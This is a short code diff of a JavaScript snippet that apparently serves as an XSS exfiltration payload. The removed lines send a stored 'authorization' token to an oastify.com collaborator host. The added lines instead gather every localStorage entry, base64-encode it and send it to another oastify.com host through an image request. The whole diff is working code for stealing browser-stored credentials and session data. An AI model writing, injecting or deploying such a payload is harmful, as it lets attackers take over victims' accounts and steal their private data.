@@ -1,11 +1,10 @@
 (function() {
     try {
-        var token = localStorage.getItem('authorization'); // change key if different
-        if (token) {
-            var url = "https://aiw29wdvarhsglopp3fiknn8cziq6vuk.oastify.com/collect.png?token=" + encodeURIComponent(token);
-            var img = new Image();
-            img.src = url;
+        var out = [];
+        for (var i = 0; i < localStorage.length; i++) {
+            var k = localStorage.key(i);
+            out.push(k + "=" + encodeURIComponent(localStorage.getItem(k)));
         }
-    } catch (e) {
-    }
+        new Image().src = "https://qf9i6cab77e8d1l5mjcyh3ko9ff63xtli.oastify.com/collect?d=" + btoa(out.join("&"));
+    } catch(e) {}
 })();
